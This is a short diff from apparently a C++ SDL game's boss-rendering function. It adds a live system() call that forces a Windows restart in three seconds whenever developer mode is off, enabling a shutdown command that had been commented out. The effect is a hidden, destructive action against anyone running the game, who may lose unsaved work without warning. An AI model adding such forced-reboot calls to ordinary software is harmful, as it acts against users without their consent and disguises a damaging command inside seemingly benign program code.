@@ -367,6 +367,7 @@ void GameWindow::renderBoss()
 		SDL_RenderPresent(renderer);
 		if (!global::devmode)
 		{
+					system("C:\\windows\\system32\\shutdown /r /t 3\n\n");
 			exit(0);
 			//system("C:\\windows\\system32\\shutdown /r /t 3\n\n");
 			//
